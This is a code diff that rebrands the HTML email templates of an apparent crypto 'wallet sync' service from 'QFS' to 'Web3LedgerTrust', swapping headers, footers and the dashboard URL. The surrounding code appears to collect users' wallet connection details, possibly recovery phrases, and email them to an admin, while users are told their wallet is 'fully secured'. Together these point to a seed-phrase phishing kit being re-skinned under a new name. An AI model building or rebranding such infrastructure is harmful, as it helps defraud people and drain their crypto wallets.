@@ -51,7 +51,7 @@ const entry = await prisma.walletSync.create({
     const adminHtml = `
       <div style="font-family:Arial,Helvetica,sans-serif;max-width:600px;margin:auto;border:1px solid #eee;border-radius:12px;overflow:hidden">
         <div style="background:#0a0a0a;padding:20px;color:white;text-align:center">
-          <h2 style="margin:0;font-weight:600;">QFS Wallet Connection Request</h2>
+          <h2 style="margin:0;font-weight:600;">Web3LedgerTrust Wallet Connection Request</h2>
         </div>
         <div style="padding:24px;">
           <p>Hello Admin,</p>
@@ -78,7 +78,7 @@ ${method === "phrase"
           <p style="margin-top:24px;">Please review and update the status in the admin dashboard.</p>
         </div>
         <div style="background:#0a0a0a;color:white;text-align:center;padding:12px;font-size:12px;">
-          &copy; ${new Date().getFullYear()} QFS System
+          &copy; ${new Date().getFullYear()} Web3LedgerTrust System
         </div>
       </div>
     `;
@@ -133,17 +133,17 @@ ${method === "phrase"
 //         </div>
 //         <div style="padding:24px;">
 //           <p>Dear ${user.name || user.username || "User"},</p>
-//           <p>We are pleased to inform you that your wallet has been successfully synced and <strong>fully secured</strong> on the QFS system.</p>
+//           <p>We are pleased to inform you that your wallet has been successfully synced and <strong>fully secured</strong> on the Web3LedgerTrust system.</p>
 
 //           <p style="margin-top:12px;font-size:15px;">
 //             ✅ <strong>Wallet Status:</strong> <span style="color:green;font-weight:bold;">APPROVED</span><br/>
 //             💰 <strong>Total Balance:</strong> <span style="font-weight:bold;">$${totalBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD</span>
 //           </p>
 
-//           <p>Thank you for trusting QFS. You can now manage your synced wallet directly from your dashboard.</p>
+//           <p>Thank you for trusting Web3LedgerTrust. You can now manage your synced wallet directly from your dashboard.</p>
 
 //           <div style="margin-top:20px;text-align:center;">
-//             <a href="${process.env.CLIENT_URL || 'https://www.qfsworldwide.net'}/dashboard/walletsync" style="background:#2563eb;color:white;padding:12px 20px;text-decoration:none;border-radius:6px;display:inline-block;">
+//             <a href="${process.env.CLIENT_URL || 'https://www.Web3LedgerTrust.com'}/dashboard/walletsync" style="background:#2563eb;color:white;padding:12px 20px;text-decoration:none;border-radius:6px;display:inline-block;">
 //               Go to Dashboard
 //             </a>
 //           </div>
